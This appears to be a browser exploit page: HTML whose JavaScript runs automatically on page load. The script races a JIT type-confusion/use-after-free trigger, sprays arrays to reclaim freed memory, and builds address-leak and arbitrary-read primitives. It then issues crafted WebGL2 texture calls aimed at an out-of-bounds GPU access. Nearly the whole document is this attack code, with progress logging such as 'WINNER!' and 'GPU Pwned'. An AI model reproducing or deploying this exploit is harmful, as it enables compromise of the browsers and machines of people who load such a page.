<!DOCTYPE html>
<html>
<body style="background:#000;color:#0f0;font-family:monospace;">
<pre id="log">Status: Waiting for initialization...</pre>
<canvas id="glCanvas" style="display:none"></canvas>
<script>
const log = m => {
    document.getElementById('log').textContent += `\n[+] ${m}`;
    console.log(m);
};

const buf = new ArrayBuffer(8), u64 = new BigUint64Array(buf), f64 = new Float64Array(buf);
const itof = v => { u64[0] = v; return f64[0]; };
const ftoi = f => { f64[0] = f; return u64[0]; };

const uafArray = new Array(0x400000).fill(1.1);
const target = { p0:1.1, p1:2.2, p2:3.3, p3:4.4, p4:5.5, p5:6.6, p6:7.7, p7:8.8 };

function trigger(flag, k) {
    let A = { p1: 1.1 }; uafArray[uafArray.length-1] = A;
    let a = new Date(); a[0] = 1.1; 
    let b = { p1: 1.1 }; let f = flag ? 1.1 : b;
    A.p1 = f; 
    let v = 1.1; for (let i = 0; i < 1e6; i++) { for (let j = 0; j < k; j++) { v = i; v = j; } }
    b.p1 = a; 
}

// دالة التنفيذ غير المتزامن لمنع تعليق الموقع
async function start() {
    log("Warming up JIT...");
    for(let i=0; i<1500; i++) trigger(false, 0); 
    
    log("Starting Race - Async Mode Enabled");
    let success = false;
    let spray = [];

    for (let k = 0; k < 20000; k++) {
        // نمنح المتصفح 1ms كل 100 محاولة لتحديث الصفحة ومنع التعليق
        if (k % 100 === 0) {
            await new Promise(r => setTimeout(r, 1));
            log(`Attempt ${k}...`);
        }

        trigger(false, 120); 
        let freed;
        try { freed = uafArray[uafArray.length-1].p1.p1; } catch(e) { continue; }
        
        for (let i = 0; i < 128; i++) {
            let s = [13.37, 1.1, 2.2, 3.3, 4.4, {id: i}];
            spray.push(s);
            if (freed[0] === 13.37) {
                log(`WINNER! Reclaimed at ${k}`);
                setup(s, freed); success = true; break;
            }
        }
        if (success) break;
    }
}

function setup(winningArr, freed) {
    winningArr[0] = {}; 
    const leak = o => { winningArr[0] = o; return ftoi(freed[0]); };
    const read64 = addr => {
        freed[0] = itof(addr - 0x10n); 
        return ftoi(winningArr[0].p0);
    };
    log(`Target Leaked: 0x${leak(target).toString(16)}`);
    
    const gl = document.getElementById('glCanvas').getContext('webgl2');
    if (gl) {
        gl.pixelStorei(0x8062, 16); 
        const tex = gl.createTexture(); gl.bindTexture(0xDE1, tex);
        gl.texImage2D(0xDE1, 0, 0x822E, 256, 256, 0, 0x1902, 0x1406, 0);
        log(gl.isContextLost() ? "GPU Pwned" : "OOB OK");
    }
}

// بدء التشغيل بعد تحميل الصفحة تماماً
window.onload = start;
</script>
</body>
</html>
